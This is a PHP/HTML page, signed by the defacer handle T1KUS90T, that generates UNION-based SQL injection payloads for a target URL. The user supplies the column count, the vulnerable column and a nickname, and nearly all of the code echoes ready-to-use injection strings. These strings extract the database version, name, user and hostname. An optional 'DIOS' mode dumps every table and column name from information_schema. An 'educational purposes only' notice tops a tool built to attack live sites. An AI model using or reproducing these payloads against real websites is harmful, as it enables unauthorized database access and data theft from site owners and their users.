<html>
<head>
<title>SQLi Printing Tools by T1KUS90T</title>
<style>
@import url("https://fonts.googleapis.com/css?family=Gloria+Hallelujah");
body {
	background-image: url("https://images4.alphacoders.com/793/793276.jpg");
	background-position: center;
	background-attachment: fixed;
	background-repeat: no-repeat;
}

select {
	width: 15%;
	height: 25px;
	background: white;
	border: 2px dotted red;
}

input[type=text] {
	height: 25px;
	background: white;
	border: 2px dotted red;
	width: 25%;
}

input[type=submit] {
	height: 25px;
	width: 9%;
	background: white;
	border: 2px dotted red;

}

textarea {
	width: 25%;
	height: 20%;
	background: white;
	border: 2px dotted red;
}

fieldset {
	border: 2px dotted red;
	width: 20%;	
}
</style>
</head>
<font face="Gloria Hallelujah" color="black" size="5" style="text-shadow:red 0px 2px 2px">SQLi Printing Tools</font><br><br>
<fieldset>
<legend><font face="calibri">NOTICE</font></legend>
<pre>Just for educational purposes only<br>Knowledge is free, Knowledge is power<br>Author : <a href="http://facebook.com/UndeathRommy" target="_blank" style="text-decoration:none"><font color="black">Yrid06 / T9_1n73ct0r [ T1KUS90T ]</font></a> </pre>
</fieldset><br>
<form method="post">
<input type="text" name="site" placeholder=" http://site.com/index.php?id= "><br><br>
<input type="text" name="total" placeholder=" Total Columns "><br><br>
<input type="text" name="columns" placeholder=" Vulnerable Columns "><br><br>
<input type="text" name="nick" placeholder=" Your Leetname "><br><br>
<select name="dios">
	<option> With Dios</option>
	<option> Without Dios</option>
</select>&nbsp;&nbsp;&nbsp;
<input type="submit" value="Print!">
</form>

<?php

// coded by Yrid06 a.k.a T9_1n73ct0r
// facebook.com/UndeathRommy - facebook.com/T1KUS90T
// for educational purposes only 
// u can add more columns

error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$satu = $_POST['site'];
$dua = $_POST['columns'];
$tiga = $_POST['nick'];
$empat = $_POST['dios'];
$lima = $_POST['total'];

echo "<textarea>";
if ($_POST == true) {
	if ($lima == 1 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@))-- -";
	} elseif ($lima == 1 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}


	if ($lima == 2 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),2-- -";
	} elseif ($lima == 2 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),2-- -";
	}


	if ($lima == 2 && $dua == 2 && $empat == 'With Dios') {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@))-- -";
	} elseif ($lima == 2 && $dua == 2) {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}


	if ($lima == 3 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),2,3-- -";
	} elseif ($lima == 3 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),2,3-- -";
	}


	if ($lima == 3 && $dua == 2 && $empat == 'With Dios') {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),3-- -";
	} elseif ($lima == 3 && $dua == 2) {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),3-- -";
	}


	if ($lima == 3 && $dua == 3 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@))-- -";
	} elseif ($lima == 3 && $dua == 3) {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}


	if ($lima == 4 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),2,3,4-- -";
	} elseif ($lima == 4 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),2,3,4-- -";
	}


	if ($lima == 4 && $dua == 2 && $empat == 'With Dios') {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),3,4-- -";
	} elseif ($lima == 4 && $dua == 2) {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),3,4-- -";
	}


	if ($lima == 4 && $dua == 3 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),4-- -";
	} elseif ($lima == 4 && $dua == 3) {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),4-- -";
	}


	if ($lima == 4 && $dua == 4 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@))-- -";
	} elseif ($lima == 4 && $dua == 4) {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}


	if ($lima == 5 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),2,3,4,5-- -";
	} elseif ($lima == 5 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),2,3,4,5-- -";
	}


	if ($lima == 5 && $dua == 2 && $empat == 'With Dios') {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),3,4,5-- -";
	} elseif ($lima == 5 && $dua == 2) {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),3,4,5-- -";
	}


	if ($lima == 5 && $dua == 3 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),4,5-- -";
	} elseif ($lima == 5 && $dua == 3) {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),4,5-- -";
	}


	if ($lima == 5 && $dua == 4 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),5-- -";
	} elseif ($lima == 5 && $dua == 4) {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),5-- -";
	}


	if ($lima == 5 && $dua == 5 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,4,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@))-- -";
	} elseif ($lima == 5 && $dua == 5) {
		echo $satu." and false union select 1,2,3,4,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}


	if ($lima == 6 && $dua == 1 && $empat == 'With Dios') {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),2,3,4,5,6-- -";
	} elseif ($lima == 6 && $dua == 1) {
		echo $satu." and false union select concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),2,3,4,5,6-- -";
	}


	if ($lima == 6 && $dua == 2 && $empat == 'With Dios') {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),3,4,5,6-- -";
	} elseif ($lima == 6 && $dua == 2) {
		echo $satu." and false union select 1,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),3,4,5,6-- -";
	}


	if ($lima == 6 && $dua == 3 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x5c6e,table_name,column_name)),@)),4,5,6-- -";
	} elseif ($lima == 6 && $dua == 3) {
		echo $satu." and false union select 1,2,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),4,5,6-- -";
	}


	if ($lima == 6 && $dua == 4 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c62723e,table_name,column_name)),@)),5,6-- -";
	} elseif ($lima == 6 && $dua == 4) {
		echo $satu." and false union select 1,2,3,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),5,6-- -";
	}


	if ($lima == 6 && $dua == 5 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,4,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c62723e,table_name,column_name)),@)),6-- -";
	} elseif ($lima == 6 && $dua == 5) {
		echo $satu." and false union select 1,2,3,4,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname),6-- -";
	}


	if ($lima == 6 && $dua == 6 && $empat == 'With Dios') {
		echo $satu." and false union select 1,2,3,4,5,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c62723e,table_name,column_name)),@))-- -";
	} elseif ($lima == 6 && $dua == 6) {
		echo $satu." and false union select 1,2,3,4,5,concat(0x".bin2hex($tiga).",0x3c62723e,version(),0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,@@hostname)-- -";
	}
}
echo "</textarea>";
?>
</html>
